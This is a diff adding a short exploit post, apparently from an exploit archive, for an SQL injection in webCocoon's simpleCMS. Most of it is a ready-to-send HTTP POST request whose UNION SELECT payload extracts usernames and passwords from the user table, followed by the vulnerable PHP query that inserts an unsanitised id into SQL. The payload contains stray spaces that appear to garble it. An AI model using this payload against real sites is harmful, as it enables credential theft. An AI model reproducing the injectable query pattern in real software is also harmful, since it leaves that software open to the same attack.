@@ -1,0 +1,32 @@
+#############################################################
+# webCocoon's simpleCMS Vulnerability
+
+# Plugin Home: http://webcocoon.wordpress.com
+
+# Author:_ÝNFAZCI_
+
+# Site: www.1923turk.biz
+  
+##############################################################
+
+# Exploit: 
+            
+
+Vuln file: /content/post/show.php
+
+
+Exploit:
+
+
+POST http://[host]/[path]/index.php HTTP/1.0
+Content-type: application/x-www-form-urlencoded
+
+id=xek' union select null,concat_ws(0x3a,username,password),null,null,n  ull,null,null,null,null,null,null,null,null,null,n  ull,null from user -- &mode=post&gfile=show
+ 
+
+
+
+//Show post 
+$get_post = mysql_query("SELECT*FROM post WHERE post_id = '$id' AND status = 'published'"); 
+$post_result = mysql_num_rows($get_post); 
+$post = mysql_fetch_array($get_post); 
